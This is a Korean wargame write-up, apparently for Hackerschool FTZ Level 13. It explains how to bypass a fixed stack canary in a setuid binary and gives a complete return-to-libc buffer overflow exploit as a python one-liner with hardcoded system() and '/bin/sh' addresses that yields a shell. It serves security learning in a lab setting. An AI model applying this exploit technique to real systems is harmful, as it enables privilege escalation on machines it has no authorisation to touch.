---
sort: 13
---

# Level 13

```note
id : level13

password : have no clue
```

hint를 보면 attackme의 소스코드가 나온다.<br>
attackme에 setuid가 걸려있으니 얘를 공격해보자.

```c
#include <stdlib.h> 

main(int argc, char *argv[])
{
   long i=0x1234567;
   char buf[1024];

   setreuid( 3094, 3094 );
   if(argc > 1)
   strcpy(buf,argv[1]);

   if(i != 0x1234567) {
   printf(" Warnning: Buffer Overflow !!! \n");
   kill(0,11);
   }
}
```

level11과 같은 상황이다. 그러나 지역변수 i값이 변조되었는지 확인하는 루틴이 중간에 껴있다.<br>
buffer 끝에 random값을 넣어둔 후 해당 random값이 변조가 되었는지 확인하는 과정을 통해 bof를 탐지할 수 있는데, 이를 stack canary라고 한다.<br>
여기서는 random값이 아니므로 충분히 우회가 가능하다.<br><br>
GDB를 이용하여 attackme의 main함수를 disassemble했다.

<pre>
(gdb) disas main
Dump of assembler code for function main:
0x080484a0 (main+0):	push   %ebp
0x080484a1 (main+1):	mov    %esp,%ebp
0x080484a3 (main+3):	sub    $0x418,%esp

<b>0x080484a9 (main+9):	movl   $0x1234567,0xfffffff4(%ebp) </b>

0x080484b0 (main+16):	sub    $0x8,%esp
0x080484b3 (main+19):	push   $0xc16
0x080484b8 (main+24):	push   $0xc16
0x080484bd (main+29):	call   0x8048370 (setreuid)
0x080484c2 (main+34):	add    $0x10,%esp
0x080484c5 (main+37):	cmpl   $0x1,0x8(%ebp)
0x080484c9 (main+41):	jle    0x80484e5 (main+69)
0x080484cb (main+43):	sub    $0x8,%esp
0x080484ce (main+46):	mov    0xc(%ebp),%eax
0x080484d1 (main+49):	add    $0x4,%eax
0x080484d4 (main+52):	pushl  (%eax)

<b>0x080484d6 (main+54):	lea    0xfffffbe8(%ebp),%eax
0x080484dc (main+60):	push   %eax
0x080484dd (main+61):	call   0x8048390 (strcpy) </b>

0x080484e2 (main+66):	add    $0x10,%esp

<b>0x080484e5 (main+69):	cmpl   $0x1234567,0xfffffff4(%ebp)
0x080484ec (main+76):	je     0x804850d (main+109) </b>

0x080484ee (main+78):	sub    $0xc,%esp
0x080484f1 (main+81):	push   $0x80485a0
0x080484f6 (main+86):	call   0x8048360 (printf)
0x080484fb (main+91):	add    $0x10,%esp
0x080484fe (main+94):	sub    $0x8,%esp
0x08048501 (main+97):	push   $0xb
0x08048503 (main+99):	push   $0x0
0x08048505 (main+101):	call   0x8048380 (kill)
0x0804850a (main+106):	add    $0x10,%esp
0x0804850d (main+109):	leave  
0x0804850e (main+110):	ret
</pre>

strcpy가 사용되는 부분을 살펴보면 buf의 시작주소를 알 수 있고, 0x1234567을 할당하고 비교하는 부분에서 i의 주소를 알 수 있다.<br>
buf의 시작주소는 $ebp-0x418이고, i의 주소는 $ebp-0xc이다. 따라서 간격계산을 하여 i값이 손상되지 않도록 해야한다.

<img src="/picture/hacker_school/ftz/level13.png" width="700"/>

```bash
[level13@ftz level13]$ ldd ./attackme 
	libc.so.6 => /lib/tls/libc.so.6 (0x42000000)
	/lib/ld-linux.so.2 => /lib/ld-linux.so.2 (0x40000000)
```

사용되는 라이브러리와 mapping위치가 level11과 같은 것을 확인할 수 있다. 따라서 아래와 같이 shell을 딸 수 있었다.

```bash
# padding 0x40c byte + i 값 + 12 byte padding + system함수 주소 + 4byte padding + "/bin/sh" 주소
[level13@ftz level13]$ ./attackme `python -c "print('A'*0x40c+'\x67\x45\x23\x01AAAAAAAAAAAA\xc0\xf2\x03\x42\x41\x41\x41\x41\xa4\x7e\x12\x42\n')"`
sh-2.05b$ my-pass
```

```tip
## 알게 된 점

buffer overflow, RTL

stack canary
```